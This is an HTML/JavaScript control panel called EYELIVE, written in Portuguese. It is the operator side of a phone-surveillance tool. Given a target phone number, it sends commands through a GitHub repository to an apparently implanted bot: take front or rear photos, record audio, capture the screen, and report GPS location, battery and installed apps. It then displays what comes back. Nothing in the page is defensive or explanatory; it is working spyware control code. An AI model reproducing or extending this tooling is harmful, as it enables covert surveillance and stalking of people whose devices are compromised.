<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>EYELIVE</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0a;color:#fff;font-family:monospace;min-height:100vh}
        .header{background:#000;padding:20px;text-align:center;border-bottom:2px solid #ffd700}
        .header h1{color:#ffd700;font-size:1.5em;letter-spacing:3px}
        .container{max-width:450px;margin:0 auto;padding:20px}
        .card{background:#111;border:1px solid #222;border-radius:15px;padding:20px;margin:15px 0}
        input{width:100%;padding:15px;background:#000;border:1px solid #333;color:#fff;border-radius:10px;font-size:1.1em;text-align:center;margin:8px 0}
        .btn{width:100%;padding:15px;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:1em;margin:5px 0}
        .btn-gold{background:#ffd700;color:#000}.btn-green{background:#00ff88;color:#000}.btn-red{background:#ff4400;color:#fff}
        .result{background:#000;border:1px solid #222;border-radius:10px;padding:15px;margin:10px 0;min-height:100px;font-size:.85em;color:#aaa;word-break:break-all}
        .result img{width:100%;border-radius:8px;margin:10px 0}
        .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
        small{color:#888;font-size:.7em}
    </style>
</head>
<body>
<div class="header"><h1>EYELIVE</h1></div>
<div class="container">
    <div class="card" id="card-token">
        <h2 style="color:#ffd700;margin-bottom:10px">🔑 Primeiro Acesso</h2>
        <p style="color:#aaa;font-size:.8em;margin-bottom:10px">Cole seu Token GitHub (só 1 vez)</p>
        <input type="password" id="tokenInput" placeholder="ghp_...">
        <button class="btn btn-gold" onclick="saveToken()">💾 Salvar Token</button>
        <small><a href="https://github.com/settings/tokens" target="_blank" style="color:#ffd700">Criar token (classic, repo)</a></small>
    </div>
    <div class="card" id="card-main" style="display:none">
        <h2 style="color:#ffd700;margin-bottom:10px">📱 Dispositivo</h2>
        <input type="text" id="phone" placeholder="+55 11 99999-9999" autofocus>
        <button class="btn btn-gold" onclick="send('status')">📊 Status</button>
        <div class="grid">
            <button class="btn btn-green" onclick="send('foto_frontal')">📸 Frontal</button>
            <button class="btn btn-green" onclick="send('foto_traseira')">📸 Traseira</button>
            <button class="btn btn-red" onclick="send('audio')">🎤 Audio</button>
            <button class="btn btn-gold" onclick="send('screenshot')">📱 Tela</button>
        </div>
    </div>
    <div class="result" id="result"></div>
</div>
<script>
function saveToken(){
    var t=document.getElementById('tokenInput').value.trim();
    if(t){localStorage.setItem('eyelive_token',t);document.getElementById('card-token').style.display='none';document.getElementById('card-main').style.display='block'}
}
function getToken(){return localStorage.getItem('eyelive_token')||''}
function hash(s){var h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0}return Math.abs(h).toString(16).substring(0,12)}
async function send(cmd){
    var T=getToken();if(!T){alert('Cole o token primeiro!');return}
    var p=document.getElementById('phone').value.replace(/[^0-9]/g,'');
    if(!p){alert('Digite o numero!');return}
    var id=hash(p);var data={cmd:cmd,target:p};
    var content=btoa(JSON.stringify(data));
    document.getElementById('result').innerHTML='⏳ Enviando...';
    try{
        var url='https://api.github.com/repos/gynbetfc/eyelive/contents/comandos/'+id+'.json';
        var h={'Authorization':'token '+T,'Accept':'application/vnd.github.v3+json'};
        await fetch(url,{method:'PUT',headers:h,body:JSON.stringify({message:'CMD',content:content,branch:'main'})});
        document.getElementById('result').innerHTML='⏳ Aguardando resposta (10s)...';
        await new Promise(r=>setTimeout(r,10000));
        var r2=await fetch('https://api.github.com/repos/gynbetfc/eyelive/contents/respostas/'+id+'.json',{headers:h});
        if(r2.ok){
            var data=await r2.json();var resp=JSON.parse(atob(data.content));show(resp);
        }else{document.getElementById('result').innerHTML='❌ Sem resposta. O bot esta rodando?'}
    }catch(e){document.getElementById('result').innerHTML='❌ Erro'}
}
function show(r){var h='';if(r.cmd=='status'&&r.result){try{var d=JSON.parse(r.result);h+='<p>📱 <b>'+d.phone+'</b> | 🕐 '+d.time+'</p>';h+='<p>🔋 <b style=color:#00ff88>'+d.bateria+'</b></p>';h+='<p>📍 '+JSON.stringify(d.gps)+'</p>';h+='<p>📱 Apps: '+d.apps.join(', ')+'</p>'}catch(e){h+=r.result}}else if(r.result&&r.result.length>100){h+='<p>✅ '+r.cmd+' recebido!</p>';if(r.cmd.includes('foto')||r.cmd.includes('screen'))h+='<img src="data:image/jpeg;base64,'+r.result+'">';else if(r.cmd=='audio')h+='<audio controls src="data:audio/aac;base64,'+r.result+'"></audio>'}else{h+=JSON.stringify(r)}document.getElementById('result').innerHTML=h}
if(getToken()){document.getElementById('card-token').style.display='none';document.getElementById('card-main').style.display='block'}
</script>
</body>
</html>
